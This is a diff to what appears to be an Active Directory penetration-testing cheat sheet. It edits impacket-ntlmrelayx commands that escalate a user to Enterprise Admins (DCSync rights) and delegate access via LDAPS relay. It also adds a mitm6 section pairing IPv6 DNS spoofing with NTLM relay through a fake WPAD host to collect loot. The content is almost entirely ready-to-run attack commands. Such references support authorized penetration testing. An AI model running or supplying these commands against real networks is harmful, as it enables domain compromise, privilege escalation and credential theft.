@@ -675,12 +675,12 @@ pre2k auth -d <AD_domain> -dc-ip <Domain_Controller_IP>
 
   ### NTLMRelayx escalate user to Enterprise Admins (DCSync rights)
   ```shell
-  sudo impacket-ntlmrelayx -t ldaps://<target> --escalate-user <AD_user>
+  sudo impacket-ntlmrelayx -t ldaps://<Domain_Controller_IP> --escalate-user <AD_user>
   ```
 
   ### NTLMRelayx delegate access
   ```shell
-  sudo impacket-ntlmrelayx -t ldaps://<target> --delegate-access
+  sudo impacket-ntlmrelayx -t ldaps://<Domain_Controller_IP> --delegate-access
   ```
 
   ### Disbale SMB and HTTP in Responder.conf
@@ -709,6 +709,21 @@ pre2k auth -d <AD_domain> -dc-ip <Domain_Controller_IP>
   ```shell
   sudo responder -I eth0 
   ```
+</details>
+
+<details>
+  <summary> mitm6-relay </summary>   
+
+  ### mitm6
+  ```shell
+  sudo mitm6 -d <Domain_Name>
+  ```
+
+  ### NTLMRelayx 
+  ```shell
+  impacket-ntlmrelayx -6 -t ldaps://<Domain_Controller_IP> -wh fakewpad.<Domain_Name> -l loot 
+  ```
+
 </details>
 
 <details>
